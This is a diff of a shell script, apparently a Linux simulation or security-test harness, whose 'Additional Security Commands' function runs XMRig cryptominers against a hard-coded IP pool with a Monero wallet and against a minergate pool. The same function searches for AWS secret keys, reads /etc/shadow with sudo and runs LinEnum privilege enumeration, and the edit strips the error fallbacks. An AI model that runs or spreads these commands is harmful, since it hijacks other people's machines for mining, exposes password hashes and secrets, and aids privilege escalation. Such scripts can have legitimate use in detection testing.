@@ -60,7 +60,7 @@ simulate_linux() {
 run_additional_commands() {
     echo "Running Additional Security Commands..."
     echo "Executing XMRig with donate-level 8..."
-    ./xmrig-6.16.4/xmrig --donate-level 8 -o 47.115.41.163:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero
+    ./xmrig --donate-level 8 -o 47.115.41.163:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero
 
     echo "Executing XMRig with alternative pool..."
     ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
@@ -69,10 +69,10 @@ run_additional_commands() {
     grep "aws_secret_access_key" /path/to/some/file || echo "No AWS secrets found."
 
     echo "Attempting to read shadow file..."
-    sudo cat /etc/shadow > /dev/null || echo "Access denied (expected)."
+    sudo cat /etc/shadow > /dev/null
 
     echo "Running LinEnum script for privilege enumeration..."
-    bash -c ./LinEnum.sh || echo "LinEnum execution failed."
+    bash -c ./LinEnum.sh
     echo
 }
 
